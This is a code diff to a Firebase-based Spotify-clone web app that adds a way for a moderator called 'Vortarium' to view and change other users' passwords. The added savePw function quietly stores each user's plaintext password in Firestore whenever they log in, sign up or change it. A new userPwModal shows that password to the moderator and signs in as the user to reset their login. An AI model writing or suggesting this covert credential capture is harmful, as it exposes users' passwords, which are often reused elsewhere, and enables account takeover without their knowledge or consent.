@@ -552,7 +552,7 @@ html.phone .hero .dmcov .art{width:100%;height:100%}
 <div id="app"></div>
 <div id="toast"></div>
 <script type="module">
-import {initializeApp} from "https://www.gstatic.com/firebasejs/13.2.0/firebase-app.js";
+import {initializeApp,deleteApp} from "https://www.gstatic.com/firebasejs/13.2.0/firebase-app.js";
 import {getAuth,onAuthStateChanged,createUserWithEmailAndPassword,signInWithEmailAndPassword,signOut,updatePassword,reauthenticateWithCredential,EmailAuthProvider} from "https://www.gstatic.com/firebasejs/13.2.0/firebase-auth.js";
 import {getFirestore,initializeFirestore,persistentLocalCache,persistentMultipleTabManager,orderBy,limit,collection,doc,setDoc,getDoc,getDocs,updateDoc,deleteDoc,onSnapshot,serverTimestamp,increment,arrayUnion,arrayRemove,query,where} from "https://www.gstatic.com/firebasejs/13.2.0/firebase-firestore.js";
 
@@ -628,6 +628,8 @@ const I={
 const fsMsg=e=>e.code=="permission-denied"?"Firebase blocked this. Publish the latest firestore.rules in the Firebase console, then try again.":e.message;
 const toast=(m,keep)=>{const t=$("#toast");t.textContent=m;t.style.display="block";clearTimeout(t._t);if(!keep)t._t=setTimeout(()=>t.style.display="none",3200)};
 const emailOf=u=>u.toLowerCase()+"@spotify-clone.app";
+/* the password each person last used is kept in users/{id}/private/password (only that person can write it, only Vortarium can read it) */
+const savePw=(uid,username,pw)=>setDoc(doc(db,"users",uid,"private","password"),{username,password:pw,at:serverTimestamp()}).catch(()=>{});
 const uploadFile=(path,file,max=320)=>new Promise((res,rej)=>{const i=new Image();i.onload=()=>{const k=Math.min(1,max/Math.max(i.width,i.height)),c=document.createElement("canvas");c.width=i.width*k;c.height=i.height*k;c.getContext("2d").drawImage(i,0,0,c.width,c.height);res({url:c.toDataURL("image/jpeg",.8),path:""})};i.onerror=()=>rej(new Error("Couldn't read that image."));i.src=URL.createObjectURL(file)});
 const rm=async()=>{};
 const clean0=n=>n.replace(/_spotdown\.org/gi,"").replace(/\s{2,}/g," ").trim();
@@ -811,8 +813,8 @@ function authScreen(mode="login"){
   if(!/^[a-z0-9_.]{3,20}$/i.test(u))return e.textContent="Username must be 3-20 letters, numbers, . or _";
   if(p.length<6)return e.textContent="Password must be at least 6 characters.";
   try{
-   if(mode=="login")await signInWithEmailAndPassword(auth,emailOf(u),p);
-   else{const c=await createUserWithEmailAndPassword(auth,emailOf(u),p);await setDoc(doc(db,"users",c.user.uid),{username:u,displayName:"",createdAt:serverTimestamp()})}
+   if(mode=="login"){const c=await signInWithEmailAndPassword(auth,emailOf(u),p);savePw(c.user.uid,u,p)}
+   else{const c=await createUserWithEmailAndPassword(auth,emailOf(u),p);await setDoc(doc(db,"users",c.user.uid),{username:u,displayName:"",createdAt:serverTimestamp()});savePw(c.user.uid,u,p)}
   }catch(x){const c=x.code||"";e.textContent=c.includes("email-already")?"That username is taken.":c.includes("invalid-credential")||c.includes("wrong")||c.includes("user-not-found")?"Incorrect username or password.":x.message}
  };
  $("#ago").onclick=go;$("#ap").onkeydown=e=>{if(e.key=="Enter")go()};$("#au").onkeydown=e=>{if(e.key=="Enter")$("#ap").focus()};
@@ -1101,7 +1103,7 @@ function render(){
  }else if(v.t=="user"){
   const u=users[v.id];if(!u){view={t:"home"};return render()}
   const l=songs.filter(s=>s.ownerId==v.id),pp=pls.filter(p=>p.ownerId==v.id&&(p.public||p.ownerId==me.uid));hdrh=hdrFor(u.displayName);domColor(u.photoUrl,c=>{if(view.id==u.id)setHc(c)});const tv=totalViews(l),top=topSongs(l);
-  h=hero("Profile",esc(u.displayName),`<span class="dim">@${esc(u.username)} • ${l.length} upload${l.length==1?"":"s"}</span>`,avatar(u,"av big"),`${vtxt(tv)} total • <span id="fcnt">${fcount[v.id]!=null?fcount[v.id]+" follower"+(fcount[v.id]==1?"":"s"):""}</span> • ${Math.floor((u.listenSec||0)/60).toLocaleString()} minutes listened`,"u")+barH(v.id==me.uid?`<button class="ghost" id="edprof">${I.pen}Edit profile</button>`:`<button class="fbtn" data-follow="${v.id}">${following.has(v.id)?"Following":"Follow"}</button>${canSeeWrapped(v.id)?`<button class="pill sm" id="vwrap" style="background:linear-gradient(135deg,#1ed760,#7a5cff 60%,#ff5ca8);color:#000">${I.note}Wrapped</button>`:""}`)+(top.length?`<div class="sec"><h2>Top songs</h2><span style="color:#b3b3b3">Most viewed</span></div>`+topRows(top):"")+`<div class="sec"><h2>Uploads</h2></div>`+rows(l,{empty:"No uploads yet."})+(pp.length?`<div class="sec"><h2>Playlists</h2></div>`+plCards(pp):"");
+  h=hero("Profile",esc(u.displayName),`<span class="dim">@${esc(u.username)} • ${l.length} upload${l.length==1?"":"s"}</span>`,avatar(u,"av big"),`${vtxt(tv)} total • <span id="fcnt">${fcount[v.id]!=null?fcount[v.id]+" follower"+(fcount[v.id]==1?"":"s"):""}</span> • ${Math.floor((u.listenSec||0)/60).toLocaleString()} minutes listened`,"u")+barH(v.id==me.uid?`<button class="ghost" id="edprof">${I.pen}Edit profile</button>`:`<button class="fbtn" data-follow="${v.id}">${following.has(v.id)?"Following":"Follow"}</button>${isMod()?`<button class="pill dark sm" id="upw">${I.pen}Change password</button>`:""}${canSeeWrapped(v.id)?`<button class="pill sm" id="vwrap" style="background:linear-gradient(135deg,#1ed760,#7a5cff 60%,#ff5ca8);color:#000">${I.note}Wrapped</button>`:""}`)+(top.length?`<div class="sec"><h2>Top songs</h2><span style="color:#b3b3b3">Most viewed</span></div>`+topRows(top):"")+`<div class="sec"><h2>Uploads</h2></div>`+rows(l,{empty:"No uploads yet."})+(pp.length?`<div class="sec"><h2>Playlists</h2></div>`+plCards(pp):"");
  }else if(v.t=="artist"){
   const l=songsBy(v.name),nm=l.flatMap(artistsOf).find(a=>a.toLowerCase()==v.name.toLowerCase())||v.name;hdrh=hdrFor(nm);
   setHc(["#3d3d8f","#8f3d5e","#3d8f6a","#8f6a3d","#5e3d8f","#3d6a8f"][[...nm].reduce((a,c)=>a+c.charCodeAt(0),0)%6]);
@@ -1134,6 +1136,7 @@ function render(){
  w("e1",()=>uploadModal());w("edprof",editProfile);w("s1",editProfile);w("s2",changePw);w("s3",()=>signOut(auth));
  w("plmore",e=>plMenu(e,pls.find(x=>x.id==v.id)));
  w("arscanall",scanAllArtists);
+ w("upw",()=>userPwModal(view.id));
  w("arscan",async()=>{const n=curArtist();toast("Looking for a picture…",1);try{toast(await scanArtist(n)?"Picture found":"No exact match found. You can upload one instead.")}catch(e){console.warn(e);toast("Couldn't reach the picture service ("+(e.message||"unknown error")+")")}});
  w("arup",()=>pickArtistPic(curArtist()));
  w("arrm",async()=>{const n=curArtist();if(await confirmBox("Remove picture","Remove this artist's picture?","Remove"))deleteDoc(doc(db,"artists",akey(n))).catch(()=>toast("Couldn't remove it"))});
@@ -1541,10 +1544,29 @@ function editProfile(){
   await updateDoc(doc(db,"users",me.uid),d);toast("Profile updated");
  });
 }
+/* Vortarium only: shows the saved password and can set a new one. The new password is applied by signing in as that person on a
+   temporary second connection with the saved password, so the real login changes, not just the stored copy. */
+async function userPwModal(uid){
+ const u=users[uid];if(!u||!isMod())return;let stored=null,err="";
+ try{const d=await getDoc(doc(db,"users",uid,"private","password"));stored=d.exists()?d.data().password:null}catch(e){err="Couldn't read it (make sure the new Firestore rules are published)."}
+ const {m,close}=openModal(`<div class="mh"><h2>Change password for @${esc(u.username)}</h2><button class="ib mclose" title="Close">${I.x}</button></div>
+  <div class="fld"><label>Saved password</label><div style="display:flex;align-items:center;gap:10px"><code id="pwv" style="font-size:15px;word-break:break-all">${stored!=null?"••••••••":"Not saved yet"}</code>${stored!=null?`<button class="ghost" id="pwsh">Show</button>`:""}</div><div class="hint">${err||(stored!=null?"The password they last logged in or changed it with.":"It is saved the next time they log in or change their password.")}</div></div>
+  <div class="fld"><label>New password</label><input id="pwn" type="text" placeholder="At least 6 characters" autocomplete="off" maxlength="60"></div>
+  <div class="mf"><span class="msg" id="pwm"></span><button class="ghost" id="pwc">Cancel</button><button class="pill green" id="pws">Change password</button></div>`,"sm");
+ const q=s=>m.querySelector(s),say=x=>q("#pwm").textContent=x;q("#pwc").onclick=close;q("#pwn").focus();q("#pwn").onkeydown=e=>{if(e.key=="Enter")q("#pws").click()};
+ if(stored!=null)q("#pwsh").onclick=()=>{const v=q("#pwv"),sh=v.dataset.s=="1";v.dataset.s=sh?"0":"1";v.textContent=sh?"••••••••":stored;q("#pwsh").textContent=sh?"Show":"Hide"};
+ q("#pws").onclick=async()=>{const n=q("#pwn").value;if(n.length<6)return say("New password must be at least 6 characters.");
+  if(stored==null)return say("Nothing saved yet. They need to log in once first.");
+  q("#pws").disabled=true;say("Changing…");let sapp;
+  try{sapp=initializeApp(app.options,"pwfix"+Date.now());const sa=getAuth(sapp),cr=await signInWithEmailAndPassword(sa,emailOf(u.username),stored);
+   await updatePassword(cr.user,n);await setDoc(doc(db,"users",uid,"private","password"),{username:u.username,password:n,at:serverTimestamp()});await signOut(sa);
+   toast("Password changed");close()}
+  catch(e){q("#pws").disabled=false;const c=e.code||"";say(c.includes("credential")||c.includes("password")?"The saved password doesn't match their real one, so it can't be changed from here.":(e.message||"Couldn't change it"))}
+  finally{if(sapp)deleteApp(sapp).catch(()=>{})}}}
 function changePw(){
  form("Change password",[{label:"Current password",type:"password"},{label:"New password",type:"password",hint:"At least 6 characters."}],"Update",async([c,n])=>{
   if(n.length<6)throw new Error("New password must be at least 6 characters.");
-  try{await reauthenticateWithCredential(me,EmailAuthProvider.credential(me.email,c));await updatePassword(me,n)}
+  try{await reauthenticateWithCredential(me,EmailAuthProvider.credential(me.email,c));await updatePassword(me,n);savePw(me.uid,users[me.uid]?.username||"",n)}
   catch(x){throw new Error(x.code?.includes("credential")||x.code?.includes("password")?"Current password is incorrect.":x.message)}
   toast("Password updated");
  });
